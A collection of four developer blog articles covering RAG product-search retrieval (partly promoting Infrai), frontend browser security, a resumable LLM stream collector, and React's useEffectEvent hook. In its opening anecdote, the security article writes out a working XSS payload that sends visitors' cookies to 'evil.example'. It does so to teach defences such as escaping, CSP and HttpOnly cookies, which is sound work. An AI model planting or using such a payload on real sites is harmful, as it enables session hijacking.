title: Semantic Retrieval for E-commerce Product Search: Bounded Queries and Fresh Results
description:
Short answer: use a staged retrieval design with explicit collections, bounded queries, and traceable source context. For an e-commerce catalog, that contract matters more than picking a fashionable embedding model: it keeps stale inventory and duplicate listings from becoming confident answers, and it leaves you a clean path to switch providers later.

I build RAG features with an eval harness beside the first notebook. The failure that shows up there is usually mundane. A product was re-indexed into a second collection, a tenant filter was dropped, or a web source timed out while the user waited. The fix is to make freshness and query limits part of the application contract, then measure each stage separately.

The retrieval contract comes before the vector store

Start by mapping the user-visible answer to fields you can inspect. Every indexed product needs a stable product or document identifier, tenant and access-control metadata, a source URL, and an ingestion timestamp. Keep those values attached to the chunk; do not reconstruct them from generated text after retrieval.

For a healthtech marketplace, that might mean a catalog PDF, a product monograph, and an access scope on every chunk. For a normal storefront, the same rule applies to SKU, locale, and seller. The domain changes; the contract does not.

Freshness is a policy, not a hope. Keep an active collection and a staging collection, write new chunks to staging, run duplicate and permission checks, and promote the collection only after the checks pass. A query then sees one well-defined snapshot instead of a race between old and new vectors.

Infrai fits at this boundary when you want to inspect a capability before binding your code to it. Infrai offers one key and one bill across 295 routes in 20 modules. Its public discovery surface exposes schemas and runnable examples, so a later ingestion or notification step does not create another credential ledger or a new SDK. That makes a trial easier to reverse because the contract stays in your code and the integration surface is plain HTTP.

That extra state is intentional. It makes a vendor migration reversible because your application depends on collection names and metadata semantics, not on a provider-specific index object. Measure twice.

How should semantic retrieval handle e-commerce product search query limits?

Bound every expensive step. Set a maximum candidate count for the vector query, a separate cap for reranking, and a wall-clock timeout for each source. If a source misses its deadline, return the best verified context you already have and record the miss for evaluation. Never let an unbounded web fetch decide whether the search page renders.

Keep it bounded.

The limit needs an owner. Put it in configuration, expose it in traces, and test the boundary with an empty result, exactly-full result, and an over-limit result. In a catalog refresh, a 40-item candidate cap might be fine for a broad category query but wasteful for an exact SKU lookup; the contract can choose different caps while preserving the same metadata and timeout guarantees. That is the kind of small, boring decision that keeps prompt cost from drifting when someone changes a default in a downstream service.

Here is the small piece I keep in a notebook before wiring a provider. It makes the limits explicit and keeps source context reviewable. The discovery request is public, so the example does not expose a key; production calls that read or write data use Authorization: Bearer $INFRAI_API_KEY.

import os
import time
from dataclasses import dataclass
from typing import Any

import requests


@dataclass
class RetrievalContract:
    collection: str
    max_candidates: int = 40
    max_rerank: int = 8
    timeout_seconds: float = 2.0


def discover_vector_capabilities() -> dict[str, Any]:
    key = os.environ.get("INFRAI_API_KEY")
    headers = {"Authorization": f"Bearer {key}"} if key else {}
    response = requests.get(
        "https://api.infrai.cc/v1/discovery",
        headers=headers,
        timeout=5,
    )
    response.raise_for_status()
    return response.json()


def bounded_candidates(items: list[dict[str, Any]], contract: RetrievalContract):
    """Keep only reviewable results with source and access metadata."""
    accepted = []
    for item in items:
        if not item.get("source_url") or not item.get("document_id"):
            continue
        if not item.get("tenant_id") or not item.get("access_scope"):
            continue
        accepted.append(item)
        if len(accepted) == contract.max_candidates:
            break
    return accepted


def retry_after_429(call, attempts: int = 3):
    """Retry a rate-limited read with bounded exponential backoff."""
    for attempt in range(attempts):
        response = call()
        if response.status_code != 429:
            response.raise_for_status()
            return response
        delay = response.headers.get("Retry-After")
        time.sleep(float(delay) if delay else 2**attempt)
    raise RuntimeError("rate limit persisted after bounded retries")


if __name__ == "__main__":
    key = os.environ.get("INFRAI_API_KEY")
    contract = RetrievalContract(collection="catalog-active")
    manifest = discover_vector_capabilities()
    print(manifest.get("version"), contract)
    print("Authenticated vector calls require INFRAI_API_KEY:", bool(key))

The code does not pretend that a generic top_k field is portable. Before adding an upsert or query call, read the request schema from the public discovery entry for that capability and map your contract fields explicitly. The useful property here is self-description: discovery exposes the capability schema and runnable examples, so adding a new backend means reading one endpoint instead of learning another SDK. That shortens migration work without claiming that all stores behave identically.

What changes when freshness is measured instead of assumed?

I track four numbers in the eval harness: duplicate rate, stale-hit rate, permission-filter misses, and source-context completeness. Slice them by collection snapshot and query type. A single overall relevance score can look healthy while yesterday's price wins against today's inventory.

Run a freshness check after every ingestion batch. Sample products whose source timestamp changed, then assert that the active collection returns the newest permitted document. Also test a deleted listing: it should disappear from the active snapshot, not merely rank lower.

One early experiment taught me to separate retrieval from answer generation. I initially increased the candidate limit when results looked thin. That made prompts longer and did not fix duplicates; the real issue was two ingestion jobs writing the same SKU under different chunk IDs. A uniqueness check on (tenant_id, product_id, source_version) fixed the data contract, while the bounded query kept token use predictable.

Keep the logs useful but modest: query id, collection version, candidate count, timeout outcome, and source identifiers. Do not log raw protected document text by default. The trace should let a reviewer open the source URL or document identifier and understand why a result was eligible.

How do these options support a reversible product-search migration?

The right alternative depends on where you want the boundary. Elasticsearch gives teams mature lexical and filter tooling; Pinecone is a focused managed vector service; Weaviate combines vector search with a schema-oriented database experience. A provider with a broad REST surface can be attractive when search is one of several backend capabilities, provided your own contract remains in charge.

Option Strength for product search Migration trade-off
Elasticsearch Strong lexical search, filters, and operational familiarity More cluster and mapping decisions to carry between environments
Pinecone Focused managed vector indexes and namespaces Application code is coupled to its index/query model
Weaviate Schema plus vector features in one product Schema and module choices become part of your portability work
A self-describing REST layer One HTTP surface, with discovery and examples for capabilities You still own relevance tuning, snapshot policy, and provider-fit checks

For this workflow, I would try Infrai when the team wants that self-describing HTTP contract and expects to add adjacent capabilities without installing another SDK. Its discovery surface documents request and response schemas, and the platform uses one key across its broad capability set; that means the search worker, ingestion job, and a later notification step can share one credential and one integration pattern instead of accumulating separate client libraries and key-rotation paths. Those facts reduce integration inventory, while your collection and metadata contract preserves an exit route. I would stick with Elasticsearch when lexical relevance and deep faceting are the primary product, or choose Pinecone when a narrowly managed vector service is the requirement.

The catch is real: a unified API does not remove the need to validate ranking quality, filtering semantics, or regional data requirements. It is not suitable when your search team needs provider-specific indexing controls that the shared surface does not expose. Run the same golden-query set against at least two candidates before committing.

A reversible rollout plan

Put the retrieval contract behind a small Python interface. During migration, dual-write to staging only, compare IDs and source versions, and promote after the freshness and access-control checks pass. Keep the old collection readable until the new path meets the error and relevance thresholds in your eval harness.

Then remove the dual-write path in a separate change. That sequencing makes rollback a configuration decision instead of a weekend rewrite.

The measurement I would not skip is prompt cost. Candidate count, chunk size, and source citation fields all consume context. Your mileage may vary by catalog shape, and I'm not sure a single rerank limit will fit every language mix; record the distribution, not just the mean, before you tune it.

If this boundary fits your system, start with the Infrai discovery documentation and verify the live schema before implementing a write or query call.

References

  • https://docs.infrai.cc
  • https://arxiv.org/abs/2005.11401
  • https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html
  • https://docs.pinecone.io/guides/search/semantic-search
  • https://docs.weaviate.io/weaviate/search/similarity

title: Frontend Security: The Browser-Side Threats You Own
description:
⚡ TL;DR: Frontend engineers own real browser-side attacks: XSS, CSRF, clickjacking, supply chain. The core defense is never trusting input, with CSP as your safety net for the escape you missed and secure cookies to prove a request is genuine.

Contents

  • A comment field that ran code in every visitor's browser
  • The one principle behind all of it
  • The picture: from untrusted input to a safe page
  • The four threats at a glance
  • XSS: the difference is one render call
  • CSP: the safety net for the escape you missed
  • Cookies and CSRF: prove the request is really yours
  • Supply chain: the attacker who never touched your code
  • Common mistakes that ship to production
  • Takeaways
  • Where to go next

A comment field that ran code in every visitor's browser

A side project I shipped had a public comments section. Plain textarea, save the string, render it back on the page. It worked beautifully, until someone posted a comment that was not text. It was <img src=x onerror="fetch('https://evil.example/c?'+document.cookie)">. The browser tried to load the broken image, the onerror handler fired, and every single person who opened that page silently shipped their session cookie to a server I did not control. I had not written a single line of malicious code. I just rendered a string the way I render every other string.

That is the whole game. Most frontend security bugs are not exotic, they are the default behavior of the browser doing exactly what you told it to. This article walks the threats a frontend engineer is on the hook for: XSS, CSRF, clickjacking, Content Security Policy, secure cookie flags, and supply-chain risk in your bundle. Not theory, the concrete defense for each.

📌 Who this is for: Frontend engineers who can build a React/TypeScript app but have never been the person responsible when a pen-test report lands. If you have ever typed dangerouslySetInnerHTML and felt a small flicker of doubt, this is for you. No prior security background assumed.

The one principle behind all of it

The browser runs whatever code ends up on the page, make sure it's only yours.

Every threat below is a variation on a single failure: code or actions you did not author end up executing with your user's identity, on your origin. XSS is attacker code running as your page. CSRF is the attacker borrowing your user's logged-in session. Clickjacking is the attacker borrowing your user's clicks. Supply chain is attacker code arriving inside a dependency you trusted. Once you see it as "whose code is this, and who is it acting as," the defenses stop feeling like a random checklist.

In the real world In tech
A bouncer who frisks everyone at the door Escaping / sanitizing all untrusted input before it renders
A guest list of who is allowed to perform on stage Content Security Policy, only these script sources may run
An ID check before honoring a member's request CSRF tokens + SameSite cookies, prove the request came from your app
Frosted glass so nobody can trick a member into signing through it Frame-busting headers against clickjacking

Frontend security mapped to a building you let the public into.

The picture: from untrusted input to a safe page

Two streams of untrusted material flow toward your page: data your users type, and third-party scripts you pull in. Each defense sits between a source and the rendered page. Trace one flow through this and the rest of the article is just detail.

Untrusted input and third-party code pass through layered defenses before anything renders or executes.

  1. Input arrives untrusted: A comment, a URL query param, a profile name, treat every byte the user controls as potentially hostile, even from logged-in users.
  2. Escape on output: When you render it, the framework turns < into < so it shows as text. The attack string becomes harmless characters on the screen instead of a live tag.
  3. CSP backstops you: Even if one escape is missed, a Content-Security-Policy header tells the browser to refuse any inline or off-allowlist script, so the injected code never runs.
  4. Cookies prove identity safely: SameSite + Secure + HttpOnly flags mean session cookies travel only on same-site requests over HTTPS and cannot be read by script, defanging both CSRF and cookie theft.
  5. Only your code reaches the page: What renders is text you intended and scripts you allowlisted. Nothing the attacker supplied executes with your origin's authority.

The four threats at a glance

Before the code, here is the map. Memorize the defense column, that is your job description.

Threat What it is Defense
XSS Attacker-supplied script runs as your page, with access to the DOM, cookies, and your user's session. Render untrusted data as text (auto-escaping); sanitize HTML; never feed user data to dangerouslySetInnerHTML; add CSP as backstop.
CSRF A malicious site triggers an authenticated request to your app using the victim's logged-in cookies. SameSite=Lax/Strict cookies + anti-CSRF token (double-submit or synchronizer) on state-changing requests.
Clickjacking Your page is loaded in an invisible iframe over a decoy, so the victim's clicks hit your UI unknowingly. Content-Security-Policy: frame-ancestors 'none' (or X-Frame-Options: DENY) to forbid framing.
Supply chain Malicious or compromised code ships inside an npm dependency and ends up in your bundle. Lockfiles + npm audit, pin & review deps, Subresource Integrity for CDN scripts, and CSP to limit what they can reach.

The browser-side threats a frontend engineer owns, and the primary defense for each.

XSS: the difference is one render call

XSS (cross-site scripting) is the big one, and it is almost always self-inflicted. React, Vue, Angular all escape interpolated values by default, {userComment} in JSX renders the literal characters, so the attack from the intro becomes inert text. You only lose that protection when you go out of your way to bypass it. The single most dangerous escape hatch in React is dangerouslySetInnerHTML. The name is a warning, not a dare.

Comment.tsx

// UNSAFE, renders the string as live HTML.
// If `comment` contains <img onerror=...>, the browser executes it.
function CommentUnsafe({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}

// SAFE, JSX escapes the value, so it renders as plain text.
// <img onerror=...> shows up as visible characters, never runs.
function Comment({ comment }: { comment: string }) {
  return <div>{comment}</div>;
}

// If you GENUINELY need to render user HTML (rich-text editor output),
// sanitize first with a vetted library, never trust raw input.
import DOMPurify from "dompurify";

function RichComment({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

The rule: default to text rendering. Reach for raw HTML only when a product requirement forces it (a WYSIWYG editor, sanitized markdown), and when you do, run it through a maintained sanitizer like DOMPurify every time, not just once at save. This is the same vulnerability class covered server-side in Preventing Injection Attacks, the input is hostile at every layer.

CSP: the safety net for the escape you missed

Auto-escaping is your primary defense, but you are human and apps are large. Content Security Policy is the backstop: an HTTP response header that tells the browser which sources of script, style, and other content are allowed to execute. With a strict CSP, even a successful injection fails, the browser simply refuses to run an inline <script> or load code from a domain you did not allowlist.

CSP response header

<!-- Sent as an HTTP header on every HTML response. -->
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.example;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self' https://api.yourapp.example;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self'

<!-- script-src 'self' = only scripts from your own origin run.
     No inline <script> executes, no eval(), no injected handlers.
     frame-ancestors 'none' also kills clickjacking in one line. -->

Note frame-ancestors 'none', that single directive is your clickjacking defense too. It tells browsers no site may load your page in a frame, so an attacker cannot overlay your UI under a decoy. Start CSP in Content-Security-Policy-Report-Only mode to see what would break, fix the violations, then enforce. Avoid 'unsafe-inline' for scripts, it defeats most of the point.

Cookies and CSRF: prove the request is really yours

CSRF (cross-site request forgery) abuses the fact that browsers attach your cookies to requests automatically. If you are logged into your bank and visit a malicious page, a hidden form there can POST to the bank, and the browser helpfully includes your session cookie. The fix lives in how you set the cookie and how you verify the request.

  • SameSite=Lax (or Strict), the browser will not send the cookie on cross-site requests, which neutralizes the classic CSRF flow. Lax is a sane default; Strict is tighter but can log users out when they arrive from external links.
  • HttpOnly, JavaScript cannot read the cookie via document.cookie, so even a successful XSS cannot steal the session token.
  • Secure, the cookie is only ever sent over HTTPS, so it cannot leak over a plaintext connection (see HTTPS, TLS & Encryption Basics).
  • Anti-CSRF token, for extra safety on state-changing requests, issue a per-session token the server checks (double-submit cookie or synchronizer pattern). Required if you cannot rely on SameSite for legacy reasons.

Set-Cookie response header

<!-- A session cookie with every flag a frontend should expect. -->
Set-Cookie: session=abc123;
  HttpOnly;        <!-- not readable by JS -> survives XSS -->
  Secure;          <!-- HTTPS only -> no plaintext leak -->
  SameSite=Lax;    <!-- not sent cross-site -> blocks CSRF -->
  Path=/;
  Max-Age=3600

<!-- The opposite of this: a token in localStorage with no flags.
     Any XSS reads it instantly. Don't store session tokens there. -->

⚠️ localStorage is not a vault: Tokens in localStorage are readable by any script on your origin, including injected XSS. An HttpOnly cookie is invisible to JavaScript by design. Prefer HttpOnly cookies for session tokens; reserve localStorage for non-sensitive UI state.

Supply chain: the attacker who never touched your code

Your bundle is mostly other people's code. A typical frontend app pulls in hundreds of transitive npm packages, any one of which could be compromised, a maintainer's account hijacked, a popular package sold to a bad actor, a typosquatted name installed by a fat-fingered command. That code runs with the exact same privileges as yours: full DOM, cookies (unless HttpOnly), network access.

  • Commit your lockfile (package-lock.json / pnpm-lock.yaml) and install with npm ci so builds are reproducible and can't silently float to a new version.
  • Run npm audit in CI and treat high-severity findings as build failures, not warnings to scroll past.
  • Vet before you add, check download counts, last publish date, maintainer, and open issues. Fewer, well-known dependencies beat a dozen one-off micro-packages.
  • Use Subresource Integrity (SRI) for any <script> loaded from a CDN: integrity="sha384-..." makes the browser refuse the file if its hash changes unexpectedly.
  • Lean on CSP, connect-src limits where third-party code can phone home, containing the blast radius even if a dep turns malicious.

Common mistakes that ship to production

  1. dangerouslySetInnerHTML with user data, the number-one frontend XSS. If the HTML originated from a user, it must be sanitized with DOMPurify first, or rendered as text instead.
  2. No Content Security Policy at all, without CSP you have exactly one layer (escaping) and zero backstop. The first missed escape becomes a full compromise.
  3. Session tokens in localStorage, readable by any script, so any XSS becomes account takeover. Use HttpOnly cookies for anything that authenticates a request.
  4. Unvetted / unpinned npm deps, adding packages without checking them, or installing without a committed lockfile, lets compromised code into your bundle with full origin privileges.
  5. Trusting client-side validation, escaping and checks in the browser are for UX. The server must independently validate and sanitize, because the attacker controls the browser.

Takeaways

The whole article in seven lines

  • The browser runs whatever code ends up on the page, your job is to make sure it's only yours.
  • Default to text rendering; treat dangerouslySetInnerHTML as a last resort and always sanitize first.
  • Add a strict Content-Security-Policy as the backstop for the escape you'll eventually miss.
  • frame-ancestors 'none' kills clickjacking in a single CSP directive.
  • Set session cookies HttpOnly; Secure; SameSite=Lax, it defangs both CSRF and cookie theft.
  • Keep auth tokens out of localStorage; any XSS can read it instantly.
  • Your dependencies are your code, pin them, audit them, and constrain them with CSP.

Where to go next

Frontend security is one layer of a defense-in-depth stack. The same hostile-input mindset shows up at the API and database, and the cookie flags above only matter if your transport is actually secure.

  • Follow the input-is-hostile thread across the stack in Preventing Injection Attacks.
  • Understand why Secure cookies and CSP delivery depend on encryption in HTTPS, TLS & Encryption Basics.
  • See where this sits in the broader curriculum on the Frontend Engineer path.

Originally published on TheSimplifiedTech, where this guide is interactive, with in-browser terminal labs and diagrams. Learn cloud and DevOps by doing, no videos.

title: 48-Hour Field Notes: My Stream Ended at [DONE] and the File Was Still Half a Function
description:
The transport told me the response was finished, and I believed it for about six hours. My collector had exited cleanly, the ledger showed [DONE], and the artifact on disk ended mid-expression inside a perfectly ordinary function body. Nothing raised, nothing logged, and the only reason I caught it was a linter run I almost skipped.

That is the failure mode I keep hitting when the model is free and the box is free: nothing is broken enough to page you. Over two days I rebuilt my collection loop around a simple rule — a stream is not a message, and only the message can be verified. This is what I tried, what broke, and what I would repeat on the next long job.

Why free access changes the shape of the bug

When inference costs real money per token, you naturally keep outputs short and your retry budget tight. Free model access plus a free server option inverts that incentive: long generations feel affordable, so you ask for whole modules, and you run the client somewhere you are not watching. Availability is the part I was given; latency, quotas, and durability are the part I refuse to assume.

So the interesting question is not "is the model good enough?" — it is "what does a truncated answer look like from the outside?" A dropped read timeout, a proxy that closes an idle connection, or a sleeping laptop all produce the same artifact: a prefix. And a prefix of valid code is often still valid code, which is exactly why it survives your smoke test.

Disclosure: This article was prepared as part of MonkeyCode's product outreach.

Three files and one rule

My rule is boring: never append to a file you cannot describe. The collector keeps three artifacts in one directory, and each one answers a different question.

  1. answer.part — the raw bytes received so far, fsynced after every chunk.
  2. ledger.jsonl — append-only events: chunk offsets, prefix hashes, stream errors, verification verdicts.
  3. prompt.txt — the exact request text, written once before the first byte arrives.

Why the prefix hash and not just a byte count? Because a byte count tells you how much you have, while a hash tells you whether the thing you are about to continue is the thing you actually collected. If a resume writes into a different file than the one you hashed, you will not notice until the diff is unreadable.

The collector, labelled honestly

The script below is the version I would keep. Treat it as a lab artifact: it is unverified as written against your endpoint, so read it before you run it, and fill in the environment variables yourself.

#!/usr/bin/env python3
"""stream_ledger.py - collect a long completion with a resumable, verifiable ledger."""
import hashlib, json, os, pathlib, time
import requests  # pip install requests

BASE  = os.environ["MC_BASE_URL"].rstrip("/")   # OpenAI-compatible base URL
KEY   = os.environ["MC_API_KEY"]
MODEL = os.environ.get("MC_MODEL", "your-model-id")
SENTINEL = "# ---END---"

WORK = pathlib.Path("run"); WORK.mkdir(exist_ok=True)
PART, LEDGER = WORK / "answer.part", WORK / "ledger.jsonl"


def note(event, **fields):
    rec = {"t": round(time.time(), 3), "event": event, **fields}
    with LEDGER.open("a", encoding="utf-8") as f:
        f.write(json.dumps(rec, sort_keys=True) + "\n"); f.flush(); os.fsync(f.fileno())


def append_chunk(text):
    with PART.open("a", encoding="utf-8") as f:
        f.write(text); f.flush(); os.fsync(f.fileno())
    return PART.stat().st_size


def prefix_sha():
    h = hashlib.sha256()
    with PART.open("rb") as f:
        for block in iter(lambda: f.read(65536), b""):
            h.update(block)
    return h.hexdigest()


def stream(messages, read_timeout=90):
    with requests.post(f"{BASE}/chat/completions",
                       json={"model": MODEL, "messages": messages, "stream": True},
                       headers={"Authorization": f"Bearer {KEY}"},
                       stream=True, timeout=(10, read_timeout)) as r:
        r.raise_for_status()
        for line in r.iter_lines(decode_unicode=True):
            if not line or not line.startswith("data:"):
                continue
            data = line[5:].strip()
            if data == "[DONE]":
                note("transport_done", bytes=PART.stat().st_size, sha=prefix_sha()[:16])
                break
            try:
                piece = json.loads(data)["choices"][0]["delta"].get("content") or ""
            except (json.JSONDecodeError, KeyError, IndexError):
                note("bad_frame"); continue   # one malformed frame is not a fatal error
            if piece:
                size = append_chunk(piece)
                note("chunk", bytes=size, sha=prefix_sha()[:16])
                yield piece

Two details matter more than the rest. The [DONE] frame is logged as transport_done, never as complete, because those are different claims. And a malformed frame skips instead of raising, since a single bad line should not cost you the whole generation.

The verifier that refuses a plausible prefix

The prompt ends with an instruction: finish the code, then emit the exact line # ---END--- on its own line. That sentinel is the whole trick, because it distinguishes "the model finished" from "the socket closed."

def verify(text):
    if not text.rstrip().endswith(SENTINEL):
        return False, "no sentinel: model output was cut, not completed"
    body = text.rsplit(SENTINEL, 1)[0]
    try:
        compile(body, "<answer>", "exec")
    except SyntaxError as e:
        return False, f"syntax error at line {e.lineno}: {e.msg}"
    return True, "parsed"

Notice the order. The sentinel check runs first, so a truncated but syntactically valid prefix fails fast instead of sailing through compile. If you only ever run the parser, you will ship half a function with a green checkmark.

Resuming without repeating the model to death

On failure I send back the last ~1200 characters as an assistant turn plus one short instruction: continue exactly there, no preamble, no summary. Two resumes maximum, then the run fails loudly. jq reads the ledger afterwards:

jq -r 'select(.event=="verify") | "\(.attempt)\t\(.ok)\t\(.why)"' run/ledger.jsonl

The 48-hour log

What broke, roughly in the order it broke.

  • Hour 2: I trusted [DONE]. Fix: a sentinel in the prompt, checked before anything else.
  • Hour 9: a resume duplicated the tail because I re-sent the full prompt without the partial answer. Fix: continuation messages always carry the tail as an assistant turn.
  • Hour 20: my verifier passed a file with balanced braces that ended inside a string literal. Fix: sentinel first, parser second, never the reverse.
  • Hour 31: I had two answer.part files and hashed the wrong one. Fix: the ledger records the absolute path next to every hash.
  • Hour 44: a long idle gap killed the connection and the retry loop ran four times silently. Fix: a resume cap of two, and a non-zero exit when it is hit.

What I would repeat without hesitation: one directory per run, fsync after every chunk, and a verdict line in the ledger for every attempt. The ledger is the only reason hour 31 was a ten-minute fix and not a rewrite.

Where this belongs, and where it does not

Workload Free model + free server? Guardrail
Long codegen you review before use Yes Sentinel, parser, two-resume cap
Batch docstring or test scaffolding Yes Same ledger, smaller outputs
Latency-sensitive request paths No No SLA to lean on
Regulated or secret data No You own the data-flow review, not the network
Anything you cannot re-run No Re-runnability is the whole safety net

Who should not use this? Anyone whose output feeds a deploy without a human read, anyone who cannot afford a second run, and anyone whose team will not look at ledger.jsonl when a job fails. If the ledger is noise to you, the workflow is just extra typing around a truncated file.

What I did not measure, and am not quoting

I am deliberately not publishing timings, throughput, or success rates here, because those numbers belong to your endpoint and your prompt shape, not to mine. The script prints its own offsets and verdicts, so your first run replaces every placeholder I could have invented. What I can say honestly is that the sentinel check caught truncations that compile() alone accepted, in more than one run.

If you already have free model access and a free server slot, the cheapest next step is small: point this collector at one long generation you already trust, and watch which hour your verify line flips to false after a transport_done.

FAQ

Is [DONE] ever a completion signal? It is a transport signal. The model's own end-of-output marker is the only thing that speaks for the content.

Do I need fsync on every chunk? It costs throughput and buys you a truthful file after a crash. For long codegen on a free box, I take the trade.

Can I skip the ledger if I only run once? You can, and then you will have no way to tell a truncated answer from a short one when it looks wrong.

title: React 19.2 useEffectEvent: Why It Won't Fix Your Deps Array
description:
Your chat room component reconnects every time someone flips the dark-mode switch. Messages in flight get dropped, the "typing…" indicator resets, and support tickets call it "random." The bug isn't the dark-mode toggle — it's that theme is sitting in a useEffect dependency array next to roomId, and React has no way to know that only one of those two values should actually restart the connection.

The reflex fix — deleting theme from the array and silencing the lint warning — trades one bug for a worse one: the notification that fires on connect now shows whatever theme was active the moment the connection opened, forever, no matter how many times the user flips the switch afterward. That's a stale closure, and it's the single most common useEffect bug there is.

React 19.2 (released October 1, 2025) shipped a real fix: the useEffectEvent Hook. It lets an Effect read a value's current state without that value forcing the Effect to re-run — something no combination of dependency-array tricks could do safely before. This article covers what useEffectEvent actually does, the exact rules for using it, and the one way people keep misusing it that makes things worse, not better.

This article is written against React 19.2+ / 19.3.0 (verified against the current npm latest dist-tag for react and cross-checked coverage of the official 19.2 release notes and the React docs' "Separating Events from Effects" guide; react.dev itself was unreachable from this run's network, so claims here lean on the npm registry plus multiple independent write-ups of the same release). useEffectEvent requires React 19.2 or later and assumes React 19-era function components and hooks throughout.

What you'll learn

By the end of this article you'll be able to:

  • Explain the real difference between a value an Effect must depend on and a value an Effect only needs to read the latest copy of
  • Reproduce the stale-closure bug that "just remove it from the deps array" causes, and name why it happens
  • Extract non-reactive logic out of an Effect with useEffectEvent and call it correctly
  • List the hard rules — where it can be called, what it can't be passed to, why it's excluded from the dependency array — and what breaks if you ignore them
  • Recognize when useEffectEvent is the wrong tool, because the value genuinely should resynchronize the Effect

Who this is for

You've written a useEffect with a dependency array, you've seen the react-hooks/exhaustive-deps lint warning, and you've been tempted to either silence it or just add everything it asks for. No class components or Server Components knowledge required.

Table of contents

  • The problem: one dependency array, two different jobs
  • The mental model: reactive values vs. Effect Events
  • Stage 1 — the naive fix and its stale closure
  • Stage 2 — useEffectEvent, correctly
  • Stage 3 — more than one Effect Event
  • Edge cases and gotchas
  • Best practices
  • FAQ
  • Cheat sheet
  • Key takeaways

The problem: one dependency array, two different jobs

Here's the chat room, written the obvious way:

function ChatRoom({ roomId, theme }) {
  useEffect(() => {
    const connection = createConnection(roomId);
    connection.on("connected", () => {
      showNotification("Connected!", theme);
    });
    connection.connect();
    return () => connection.disconnect();
  }, [roomId, theme]);

  return <h1>Welcome to {roomId}</h1>;
}

react-hooks/exhaustive-deps is doing its job here: the Effect reads both roomId and theme, so both are listed. The code is "correct" by the lint rule's own standard. It's also wrong in a way the lint rule has no way to catch, because the rule only knows one move — list everything you read — and that move doesn't distinguish between two genuinely different jobs a value can have inside an Effect:

  1. roomId decides what the Effect does. A different room means a different connection. If roomId changes and the Effect doesn't re-run, you're connected to the wrong room. This is a reactive value — the Effect's whole reason for existing is synchronized to it.
  2. theme is only read once the connection is already open, to decide what the notification looks like. It has no bearing on which room you connect to. Listing it as a dependency doesn't make the code more correct — it makes the Effect re-run (disconnect, then reconnect) for a reason that has nothing to do with what the Effect is for.

Toggle dark mode in this version and the user drops their connection. Not because anything about the connection needed to change — because the lint rule, correctly, cannot tell the difference between "this value controls what the Effect synchronizes with" and "this value is read once a thing the Effect already started happens to fire."

The mental model: reactive values vs. Effect Events

The mental model: a useEffect dependency array isn't a list of "everything this function touches" — it's a list of reactive values the Effect's job depends on. If a value changing should legitimately restart what the Effect is doing, it belongs in the array, full stop; that's not a style choice, it's correctness. But some reads inside an Effect aren't about what the Effect is doing at all — they're about what to do when something the Effect already set up happens later. React 19.2 gives that second category a name — an Effect Event — and a Hook to create one: useEffectEvent.

An Effect Event is a function, declared with useEffectEvent(fn), whose body is deliberately non-reactive: every time your component re-renders, React relinks the function to that render's latest props and state, but the function itself is never a dependency and never forces anything to re-run. You call it from inside an Effect (or from inside another Effect Event) when the thing it does should happen using whatever is current right now, not whatever was current when the Effect last ran.

Put plainly: roomId answers "what should this Effect be connected to?" — that's reactive, and it belongs in the array. theme answers "what should happen, using today's value, when the thing I already connected to does something?" — that's an Effect Event, and it has no business in the array at all.

Stage 1 — the naive fix and its stale closure

Before useEffectEvent existed, the common workaround was to simply drop theme from the array and disable the lint rule:

function ChatRoom({ roomId, theme }) {
  useEffect(() => {
    const connection = createConnection(roomId);
    connection.on("connected", () => {
      // theme is captured from THIS render, forever, until roomId changes again
      showNotification("Connected!", theme);
    });
    connection.connect();
    return () => connection.disconnect();
    // eslint-disable-next-line react-hooks/exhaustive-deps -- intentionally wrong, see below
  }, [roomId]);

  return <h1>Welcome to {roomId}</h1>;
}

This stops the reconnect. It also freezes theme at whatever it was the moment the Effect last ran. JavaScript closures capture variables by reference to the scope they were created in, not by re-reading them later — so the theme inside connection.on("connected", …) is the one value from the render that created this particular closure. Flip dark mode ten times after that; the notification keeps showing the old theme until roomId changes and the whole Effect reruns. That's the stale closure: the code looks like it reads theme, but it's reading a frozen copy from the past.

This is the trap of "just remove it from the deps array and silence the warning": you've fixed the symptom (unwanted reconnects) by reintroducing the exact class of bug the lint rule exists to prevent (stale reads), just somewhere the rule can no longer see it.

Stage 2 — useEffectEvent, correctly

useEffectEvent splits the two jobs apart explicitly instead of hiding one of them:

import { useEffect, useEffectEvent } from "react";

function ChatRoom({ roomId, theme }) {
  const onConnected = useEffectEvent(() => {
    // Always reads the CURRENT theme, no matter when this runs.
    showNotification("Connected!", theme);
  });

  useEffect(() => {
    const connection = createConnection(roomId);
    connection.on("connected", () => onConnected());
    connection.connect();
    return () => connection.disconnect();
  }, [roomId]); // only roomId — and this time that's actually correct, not a lie

  return <h1>Welcome to {roomId}</h1>;
}

Key concept: onConnected is recreated on every render like any other local function, but calling it never reads a frozen snapshot — React always runs it against the component's latest props and state. Its identity is deliberately not stable across renders (unlike a useState setter or a useCallback-memoized function) — that's by design, so nothing can accidentally rely on it staying the same or pass it around like a normal callback. It simply can never legally appear in the dependency array in the first place, so the instability never causes a re-run. The Effect's dependency array now says something true: this Effect only needs to re-run when roomId changes. theme can change a thousand times without touching the connection, and the notification will still report whatever theme is active the instant it fires.

Toggle dark mode now: no disconnect, no reconnect, and the next notification shows the theme you just switched to. Both halves of the original bug — unwanted reconnects and stale reads — are gone, because they were never actually the same problem. They were two different values wearing one dependency array.

🎮 Try it yourself

▶️ Open the interactive playground →

Runs right in your browser — poke at it and watch the concept react live.

Stage 3 — more than one Effect Event

The pattern scales past a single notification. Say the chat room also has a mute toggle that should silence a "ping" sound without, again, reconnecting:

function ChatRoom({ roomId, theme, isMuted }) {
  const onConnected = useEffectEvent(() => {
    showNotification("Connected!", theme);
  });

  const onMessage = useEffectEvent((message) => {
    if (!isMuted) playSound();
    logMessage(message, theme);
  });

  useEffect(() => {
    const connection = createConnection(roomId);
    connection.on("connected", () => onConnected());
    connection.on("message", (msg) => onMessage(msg));
    connection.connect();
    return () => connection.disconnect();
  }, [roomId]); // roomId is the only reactive value here

  return <h1>Welcome to {roomId}</h1>;
}

